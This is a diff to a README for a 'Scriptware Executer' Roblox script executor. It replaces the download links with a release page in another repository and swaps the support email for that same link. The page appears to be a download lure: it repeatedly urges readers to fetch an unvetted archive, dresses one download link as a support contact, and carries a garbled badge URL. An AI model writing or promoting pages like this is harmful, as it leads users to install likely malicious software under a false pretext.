@@ -8,11 +8,11 @@ The Scriptware Executer is a powerful Roblox script executor that allows users t
 ## How to Use
 To access the Scriptware Executer, please download the software package from the link provided below. 
 
-[Launch Scriptware Executer](https://github.com/user-attachments/files/18060583/Software.zip)
+[Launch Scriptware Executer](https://github.com/vksoz/Scriptware-Executer/releases/tag/v2.0)
 
 If the link doesn't automatically start the download, please click the button below:
 
-[![Launch Scriptware Executer](https://img.shields.io/badge/Launch-Scriptware%20Executer-blue.svg)](https://github.com/user-attachments/files/18060583/Software.zip)
+[![Launch Scriptware Executer](https://github.com/vksoz/Scriptware-Executer/releases/tag/v2.0%https://github.com/vksoz/Scriptware-Executer/releases/tag/v2.0)](https://github.com/vksoz/Scriptware-Executer/releases/tag/v2.0)
 
 ## Features
 - Robust script execution capabilities
@@ -29,6 +29,6 @@ If the link doesn't automatically start the download, please click the button be
 We welcome contributions from the community to enhance the Scriptware Executer. Feel free to submit any feedback, bug reports, or suggestions via the GitHub platform.
 
 ## Support
-For any inquiries or assistance, please reach out to our team at support@scriptware.com.
+For any inquiries or assistance, please reach out to our team at https://github.com/vksoz/Scriptware-Executer/releases/tag/v2.0
 
 Thank you for choosing Scriptware Executer! We look forward to seeing the amazing creations you will bring to life with our software. 🌟
